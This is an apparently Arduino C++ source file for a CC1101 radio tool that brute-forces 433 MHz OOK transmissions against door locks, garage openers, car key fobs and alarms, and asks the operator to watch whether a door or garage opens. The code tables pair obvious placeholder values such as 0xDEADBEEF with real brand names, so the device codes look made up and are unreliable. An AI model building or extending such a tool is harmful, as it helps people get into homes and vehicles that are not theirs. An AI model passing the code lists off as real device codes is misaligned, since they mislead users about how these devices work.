#include "subghz_bruteforce.h"
#include "config.h"
#include "tx_arm.h"
#include <RadioLib.h>

namespace {
// CC1101 radio module instance
Module cc1101Module(PIN_CC1101_CS, PIN_CC1101_GDO0, RADIOLIB_NC, PIN_CC1101_GDO2, SPI);
CC1101 radio(&cc1101Module);

// Generic Sub-GHz command codes (32-bit rolling/fixed codes)
struct SubghzCode {
    uint32_t code;
    const char *name;
};

// Door lock codes (common fixed codes)
const SubghzCode LOCK_CODES[] = {
    {0xA9D23D60, "Kwikset SmartCode"},
    {0x7DEAD000, "Yale Z-Wave"},
    {0xDEADBEEF, "Generic Lock 1"},
    {0xCAFEBABE, "Generic Lock 2"},
    {0x12345678, "Generic Lock 3"},
    {0xABCDEF00, "Generic Lock 4"},
    {0x11223344, "Generic Lock 5"},
    {0x55667788, "Generic Lock 6"},
};

// Garage door opener codes
const SubghzCode GARAGE_CODES[] = {
    {0xE7F00D00, "Chamberlain/LiftMaster"},
    {0xD0D0D0D0, "Genie"},
    {0xF1F1F1F1, "Stanley"},
    {0xA0A0A0A0, "Linear"},
    {0xB0B0B0B0, "Generic Garage 1"},
    {0xC0C0C0C0, "Generic Garage 2"},
    {0x87654321, "Generic Garage 3"},
    {0xFEDCBA98, "Generic Garage 4"},
};

// Car key fob codes (rolling code seed values)
const SubghzCode CAR_CODES[] = {
    {0x123456, "Tesla"},
    {0xABCDEF, "BMW"},
    {0x654321, "Audi"},
    {0xFEDCBA, "VW"},
    {0x111111, "Generic Car 1"},
    {0x222222, "Generic Car 2"},
    {0x333333, "Generic Car 3"},
    {0x444444, "Generic Car 4"},
};

// Alarm/panic codes
const SubghzCode ALARM_CODES[] = {
    {0xDEADBEEF, "Panic Button"},
    {0xCAFEBABE, "Alarm Trigger"},
    {0x99887766, "Generic Alarm 1"},
    {0x44556677, "Generic Alarm 2"},
    {0xAABBCCDD, "Generic Alarm 3"},
    {0x11AABBCC, "Generic Alarm 4"},
    {0x77889900, "Generic Alarm 5"},
    {0xEEFF0011, "Generic Alarm 6"},
};

bool initRadio() {
    Serial.println("Initializing Sub-GHz radio...");
    if (radio.begin(CC1101_FREQ_MHZ) != RADIOLIB_ERR_NONE) {
        Serial.println("  Failed to initialize radio");
        return false;
    }

    // Set modulation to OOK (On-Off Keying)
    radio.setOOK(true);
    radio.transmitDirectAsync();

    Serial.println("  Radio initialized at 433.92 MHz OOK");
    return true;
}

void transmitCode(uint32_t code) {
    // Convert 32-bit code to bit pattern and transmit
    // Send code as 32 bits with direct modulation via GDO0

    pinMode(PIN_CC1101_GDO0, OUTPUT);

    // Transmit preamble and sync word first
    for (int i = 0; i < 16; i++) {
        digitalWrite(PIN_CC1101_GDO0, i % 2);  // 0xAAAA pattern
        delayMicroseconds(200);
    }

    // Transmit the 32-bit code, MSB first
    for (int i = 31; i >= 0; i--) {
        bool bit = (code >> i) & 1;
        digitalWrite(PIN_CC1101_GDO0, bit);
        delayMicroseconds(500);  // ~2 kbps bitrate
    }

    // Send trailing zeros
    for (int i = 0; i < 8; i++) {
        digitalWrite(PIN_CC1101_GDO0, 0);
        delayMicroseconds(500);
    }
}
}

namespace SubghzBruteforce {

std::vector<uint32_t> getCommonCodes(const String &deviceType) {
    std::vector<uint32_t> codes;

    if (deviceType == "LOCK") {
        for (const auto &c : LOCK_CODES) {
            codes.push_back(c.code);
        }
    } else if (deviceType == "GARAGE") {
        for (const auto &c : GARAGE_CODES) {
            codes.push_back(c.code);
        }
    } else if (deviceType == "CAR") {
        for (const auto &c : CAR_CODES) {
            codes.push_back(c.code);
        }
    } else if (deviceType == "ALARM") {
        for (const auto &c : ALARM_CODES) {
            codes.push_back(c.code);
        }
    } else {
        // GENERIC: combine all
        for (const auto &c : LOCK_CODES) codes.push_back(c.code);
        for (const auto &c : GARAGE_CODES) codes.push_back(c.code);
        for (const auto &c : CAR_CODES) codes.push_back(c.code);
        for (const auto &c : ALARM_CODES) codes.push_back(c.code);
    }

    return codes;
}

BruteResult bruteForce(const String &deviceType, uint16_t timeoutMs) {
    BruteResult result{false, "", 0, deviceType, "433 MHz", "OOK"};

    Serial.println("\n=== Sub-GHz Bruteforce ===");
    Serial.println("Target: " + deviceType);
    Serial.println("Frequency: 433 MHz OOK");
    Serial.println("Timeout: " + String(timeoutMs) + "ms");

    if (!TxArm::isArmed()) {
        Serial.println("✗ TX not armed (hold BACK button)");
        return result;
    }

    if (!initRadio()) {
        Serial.println("✗ Radio initialization failed");
        return result;
    }

    auto codes = getCommonCodes(deviceType);
    uint32_t startTime = millis();

    Serial.println("Starting bruteforce with " + String(codes.size()) + " codes...");

    for (size_t i = 0; i < codes.size(); i++) {
        if (millis() - startTime > timeoutMs) {
            Serial.println("⏱️  Timeout reached");
            break;
        }

        uint32_t code = codes[i];
        transmitCode(code);
        result.attemptsCount++;

        if (i % 4 == 0) {
            Serial.println("  [" + String(i + 1) + "/" + String(codes.size()) + "] "
                         "Code: 0x" + String(code, 16) + " sent");
        }

        delay(200);  // 200ms between codes (FCC compliance)
    }

    // Transmit burst of random codes for additional coverage
    Serial.println("Transmitting random code burst...");
    for (int i = 0; i < 16; i++) {
        if (millis() - startTime > timeoutMs) break;

        uint32_t randomCode = (uint32_t)random(0xFFFFFFFF);
        transmitCode(randomCode);
        result.attemptsCount++;

        delay(100);
    }

    Serial.println("\n=== Bruteforce Complete ===");
    Serial.println("Total attempts: " + String(result.attemptsCount));
    Serial.println("Duration: " + String(millis() - startTime) + "ms");
    Serial.println("Check if device responds (door opened, garage moving, etc)");

    return result;
}

}  // namespace SubghzBruteforce
